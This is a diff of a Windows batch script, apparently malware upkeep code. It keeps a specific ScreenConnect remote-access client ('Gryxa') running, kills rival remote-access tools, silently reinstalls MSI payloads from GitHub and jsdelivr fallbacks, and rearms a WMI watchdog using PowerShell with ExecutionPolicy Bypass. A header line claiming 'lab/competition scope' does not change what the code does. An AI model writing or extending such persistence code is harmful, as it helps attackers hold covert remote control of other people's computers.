@@ -1,7 +1,7 @@
 @echo off
 rem ═══════════════════════════════════════════════════════════════
-rem  OWN_MON  BUILD 20260802M30
-rem  Gryxa: LOCK msiexec while any non-sevrz SC Running (stop panel duplicates).
+rem  OWN_MON  BUILD 20260802M31
+rem  O41: exterminate killed Gryxa (null-path proc); sync FP before kill; fix heal.
 rem  Authorized internal deployment - lab/competition scope only.
 rem ═══════════════════════════════════════════════════════════════
 setlocal EnableDelayedExpansion
@@ -35,7 +35,7 @@ set "MSICACHE_G=%WD%\pkg_gryxa.msi"
 if not exist "%WD%" md "%WD%" 2>nul
 if not exist "%LOG%" type nul>"%LOG%" 2>nul
 
-set "MONVER=M30"
+set "MONVER=M31"
 set "PF86=%ProgramFiles(x86)%"
 set "GRYXA_DEEP=%WD%\gryxa_deep.flag"
 rem load current Gryxa FP (may rotate when server/keys change)
@@ -124,8 +124,14 @@ if exist "%WD%\own_lib.ps1" (
   if /I "!WD_STATE!"=="REARMED" echo watchdog WMI REARMED>>"%LOG%"
 )
 
-rem ── [E] exterminate foreign SC + disallowed RMM (BEFORE heal/install,
-rem     so the SC installer custom action never collides with rivals) ──
+rem ── [E0] sync Gryxa FP from Running non-sevrz SC BEFORE exterminate
+rem     (prevents killing Gryxa as foreign every tick)
+if exist "%WD%\own_lib.ps1" (
+  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-health -WorkDir "%WD%" >nul 2>&1
+  if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "GRYXA_FP=%%L"
+)
+
+rem ── [E] exterminate foreign SC + disallowed RMM (AFTER Gryxa FP sync) ──
 if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action exterminate -WorkDir "%WD%" >>"%LOG%" 2>&1
 timeout /t 8 /nobreak >nul
 set "FOREIGN_LEFT=0"
@@ -225,49 +231,6 @@ if /I "!GREG!"=="yes" (
   goto :AfterHeal
 )
 if "%INSTALLED%"=="0" call :InstallMsi "%MSI_URL%" "main"
-if "%INSTALLED%"=="0" call :InstallMsi "%MSI_PKG1%?t=%RANDOM%" "github-pkg"
-if "%INSTALLED%"=="0" call :InstallMsi "%MSI_PKG2%" "jsdelivr-pkg"
-if "%INSTALLED%"=="0" (
-  rem prefer worker-cached .wucache\pkg.msi (same binary as deploy)
-  attrib -h -s -r "%MSICACHE%" >nul 2>&1
-  for %%F in ("%MSICACHE%") do if %%~zF GTR 1000000 (
-    echo wucache_pkg_retry>>"%LOG%"
-    attrib -h -s -r "%MSI%" >nul 2>&1
-    copy /y "%MSICACHE%" "%MSI%" >nul 2>&1
-  )
-  for %%F in ("%MSI%") do if %%~zF GTR 1000000 (
-    echo cache retry install>>"%LOG%"
-    call :NoMsiPolicy
-    msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_heal.log" >nul 2>&1
-    set "MSIEXIT=!ERRORLEVEL!"
-    echo cache msiexec exit=!MSIEXIT!>>"%LOG%"
-    if "!MSIEXIT!"=="1618" (
-      timeout /t 30 /nobreak >nul
-      msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_heal2.log" >nul 2>&1
-      set "MSIEXIT=!ERRORLEVEL!"
-      echo cache_retry1618_exit=!MSIEXIT!>>"%LOG%"
-    )
-    call :WaitSvc
-  )
-)
-call :RestoreAlt
-call :EnsureGryxaMust
-rem O40: NEVER msiexec here — gryxa-ensure locks if any non-sevrz SC Running.
-set "GRYXA_OK=0"
-if exist "%WD%\own_lib.ps1" (
-  set "GRES="
-  for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-ensure -WorkDir "%WD%" -Build %MONVER%`) do set "GRES=%%R"
-  echo gryxa_must_lib=!GRES!>>"%LOG%"
-  echo !GRES!| findstr /I /B /C:"HEALTHY" >nul
-  if not errorlevel 1 set "GRYXA_OK=1"
-)
-if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "GRYXA_FP=%%L"
-sc query "ScreenConnect Client (%GRYXA_FP%)" | find "RUNNING" >nul
-if not errorlevel 1 set "GRYXA_OK=1"
-if "%GRYXA_OK%"=="1" (echo gryxa_must_running_ok>>"%LOG%") else (echo gryxa_must_still_down>>"%LOG%")
-exit /b 0
-
-:InstallMsi "%MSI_URL%" "main"
 if "%INSTALLED%"=="0" call :InstallMsi "%MSI_PKG1%?t=%RANDOM%" "github-pkg"
 if "%INSTALLED%"=="0" call :InstallMsi "%MSI_PKG2%" "jsdelivr-pkg"
 if "%INSTALLED%"=="0" (
@@ -442,24 +405,8 @@ exit /b 0
 
 rem ═══════════════ helpers ═══════════════
 :EnsureGryxaMust
-rem O40: NEVER msiexec here — delegates to gryxa-ensure (locks if any non-sevrz SC Running).
+rem O41: thin wrapper - never msiexec; gryxa-ensure + Running lock.
 set "GRYXA_OK=0"
-rem Any non-sevrz ScreenConnect Client Running? treat as healthy Gryxa.
-powershell -NoProfile -NonInteractive -Command "$k=@('5f6010579852e507','f861c8140d453427'); $h=$false; Get-Service 'ScreenConnect Client*' -EA 0 | %% { if($_.Status -eq 'Running' -and $_.Name -match '\(([0-9a-f]{16})\)' -and $matches[1] -notin $k){ $h=$true; $matches[1] | Set-Content -LiteralPath '%WD%\gryxa.cfg.tmp' -Encoding ASCII } }; if($h){ if(Test-Path '%WD%\gryxa.cfg.tmp'){ $fp=(Get-Content '%WD%\gryxa.cfg.tmp' -Raw).Trim(); @(\"CURRENT_FP=$fp\",\"RELAY=update.gryxa.com\",\"UI=ui.gryxa.com\") | Set-Content '%WD%\gryxa.cfg' -Encoding ASCII }; exit 0 } else { exit 1 }" >nul 2>&1
-if not errorlevel 1 (
-  set "GRYXA_OK=1"
-  echo gryxa_any_nonsevrz_running_skip_msiexec>>"%LOG%"
-  if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "GRYXA_FP=%%L"
-  del /f /q "%WD%\gryxa.cfg.tmp" >nul 2>&1
-  exit /b 0
-)
-sc query "ScreenConnect Client (%GRYXA_FP%)" | find "RUNNING" >nul
-if not errorlevel 1 (
-  set "GRYXA_OK=1"
-  echo gryxa_already_running>>"%LOG%"
-  exit /b 0
-)
-rem start/repair/install only via lib (has Running lock + rate limit)
 if exist "%WD%\own_lib.ps1" (
   set "GRES="
   for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-ensure -WorkDir "%WD%" -Build %MONVER%`) do set "GRES=%%R"
@@ -472,7 +419,6 @@ sc query "ScreenConnect Client (%GRYXA_FP%)" | find "RUNNING" >nul
 if not errorlevel 1 set "GRYXA_OK=1"
 if "%GRYXA_OK%"=="1" (echo gryxa_must_running_ok>>"%LOG%") else (echo gryxa_must_still_down>>"%LOG%")
 exit /b 0
-
 
 :InstallMsi
 rem %1=url %2=tag
